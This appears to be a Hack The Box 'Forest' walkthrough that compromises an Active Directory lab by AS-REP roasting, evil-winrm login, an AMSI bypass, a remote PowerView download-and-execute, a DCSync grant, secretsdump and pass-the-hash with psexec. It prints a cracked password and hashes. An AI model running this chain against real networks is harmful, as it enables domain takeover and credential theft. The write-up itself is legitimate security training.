After running a basic `nmap` search, I see that `ldap` is running on port 389.

I run an `ldap` search to see what I find:

```
ldapsearch -h {target ip} 389 -x -s base -b ‘’ “(objectClass=*)” “*” +
```

I get the domain `htb.local`.

After probing several different paths via `smb`, and not getting in, I try `rpc` on port 445.

```
rpcclient -U "" -N {target ip}
rpcclient $> enumdomusers

user:[Administrator] rid:[0x1f4]       
user:[Guest] rid:[0x1f5]               
user:[krbtgt] rid:[0x1f6]              
user:[DefaultAccount] rid:[0x1f7]      
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]  
user:[andy] rid:[0x47e]                
user:[mark] rid:[0x47f]                
user:[santi] rid:[0x480]
```

I create a users list with the following users:

```
root@kali# cat users 
Administrator 
andy 
lucinda 
mark 
santi 
sebastien 
svc-alfresco

root@kali# for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

...


[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:c213afe360b7bcbf08a522dcb423566c$d849f59924ba2b5402b66ee1ef332c2c827c6a5f972c21ff329d7c3f084c8bc30b3f9a72ec9db43cba7fc47acf0b8e14c173b9ce692784b47ae494a4174851ae3fcbff6f839c833d3740b0e349f586cdb2a3273226d183f2d8c5586c25ad350617213ed0a61df199b0d84256f953f5cfff19874beb2cd0b3acfa837b1f33d0a1fc162969ba335d1870b33eea88b510bbab97ab3fec9013e33e4b13ed5c7f743e8e74eb3159a6c4cd967f2f5c6dd30ec590f63d9cc354598ec082c02fd0531fafcaaa5226cbf57bfe70d744fb543486ac2d60b05b7db29f482355a98aa65dff2f
```

I get the hash above for the user `svc-alfresco` and I get the password `s3rvice`.

I use evil-winrm to connect and shell access to the attacking ip. 

```
$ evil-winrm -i 10.129.135.40 -u svc-alfresco -p s3rvice
```

From here I can move to the user `svc-alfresco`'s Desktop and get the user flag.

```
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt e5e4e47a************************
```

To visualize our domain and users I want use the application `bloodhound`, 



Install bloodhound, then run bloodhound-python to enumerate the privilege escalation paths which downloads json files which will be mapped via bloodhound. Then run bloodhound.

```
$ sudo apt install bloodhound
$ bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -gc forest.htb.local  -c all -ns {victim ip}
$ bloodhound
```

In the Bloodhound UI the credentials for `neo4j` is `neo4j:neo4j`, then click on `Upload Data`, adding those json files from earlier. In `Start Node` add `svc-alfresco` and in `Target Node` add `Domain Admins@HTB.LOCAL`, that gives us a map of the Active Directory.

Now I go back to the Windows shell and add a new user to `Exchange Windows Permissions`

```
PS C:\Users\svc-alfresco\Documents> net user john abc123! /add /domain
PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" john /add
PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" john /add

PS C:\Users\svc-alfresco\Documents> menu

PS C:\Users\svc-alfresco\Documents> Bypass-4MSI

PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).downloadstring('http://{target ip}/PowerView.ps1')

PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'abc123!' -asplain -force

PS C:\Users\svc-alfresco\Documents> $cred = new-object system.management.automation.pscredential('htb\john', $pass)

PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

I can now run `secretsdump` as `john`, which gets the `admin`'s hash, then `psexec` with the new hash gets root access to the server. Then I print the root flag.

```
$ secretsdump.py htb/john@{victim ip}

....
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

$ psexec.py administrator@{victim ip} -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

$ type \users\administrator\desktop\root.txt
97949b4e094f030d9ac3b8608e02cfe1
```











